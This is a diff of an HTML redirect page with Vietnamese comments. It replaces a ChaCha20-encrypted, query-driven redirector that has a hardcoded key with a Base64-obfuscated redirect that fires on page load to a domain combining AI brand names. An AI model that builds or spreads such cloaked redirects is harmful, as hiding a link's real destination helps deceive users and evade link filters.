@@ -2,75 +2,18 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Redirecting...</title>
-    <script src="https://cdn.jsdelivr.net/npm/libsodium-wrappers@0.7.10/dist/modules/libsodium-wrappers.umd.min.js"></script>
 </head>
 <body>
+    <p>Đang chuyển hướng...</p>
     <script>
-        async function decryptChaCha20Poly1305(encrypted, key, nonce) {
-            try {
-                await sodium.ready; // Đợi thư viện sẵn sàng
-
-                // Chuyển Base64 URL-safe về Base64 chuẩn
-                let base64Encoded = encrypted.replace(/-/g, '+').replace(/_/g, '/');
-                // Thêm padding nếu cần
-                while (base64Encoded.length % 4 !== 0) {
-                    base64Encoded += '=';
-                }
-
-                // Giải mã Base64 về Uint8Array
-                const buffer = Uint8Array.from(atob(base64Encoded), c => c.charCodeAt(0));
-                
-                // Tách nonce (12 byte) và encrypted data (còn lại)
-                const providedNonce = buffer.slice(0, 12);
-                const data = buffer.slice(12);
-
-                // Kiểm tra nonce
-                if (Buffer.from(providedNonce).toString('base64') !== nonce) {
-                    throw new Error('Nonce mismatch');
-                }
-
-                // Chuyển key từ Base64 về Uint8Array
-                const keyBuffer = sodium.from_base64(key);
-
-                // Giải mã ChaCha20-Poly1305
-                const decrypted = sodium.crypto_aead_chacha20poly1305_decrypt(
-                    null, // Dữ liệu bổ sung (null vì không dùng)
-                    data,
-                    null, // Nonce đã được tách
-                    providedNonce, // Sử dụng nonce từ chuỗi mã hóa
-                    keyBuffer
-                );
-
-                // Chuyển về chuỗi UTF-8
-                return new TextDecoder().decode(decrypted);
-            } catch (e) {
-                console.error('Decryption error:', e);
-                return null;
-            }
-        }
-
-        // Lấy tham số URL từ query string
-        const urlParams = new URLSearchParams(window.location.search);
-        const encryptedUrl = urlParams.get('url');
-
-        // Khóa bí mật và nonce (base64, phải khớp với giá trị từ encrypt.js)
-        const secretKey = '8TqKctQsd3RZ5pVYIq9hj7TFVBmjSDOIff4486vnnAAA='; // Secret Key (base64) từ Bộ 3
-        const nonce = 'YytthR+raGdU='; // Nonce (base64) từ Bộ 3
-
-        // Giải mã và chuyển hướng
-        if (encryptedUrl) {
-            decryptChaCha20Poly1305(encryptedUrl, secretKey, nonce).then(finalUrl => {
-                if (finalUrl) {
-                    window.location.href = finalUrl;
-                } else {
-                    document.body.innerText = 'Invalid or corrupted URL. Check secret key, nonce, or encoded URL.';
-                    console.log('Encrypted URL:', encryptedUrl);
-                }
-            });
-        } else {
-            document.body.innerText = 'No URL parameter provided';
-        }
+        // Chuỗi Base64 đã mã hóa
+        const encodedUrl = "aHR0cHM6Ly9vcGVuYWlncm9rLmNvbQ==";
+        // Giải mã Base64
+        const decodedUrl = atob(encodedUrl);
+        // Chuyển hướng tới URL gốc
+        window.location.href = decodedUrl;
     </script>
 </body>
 </html>
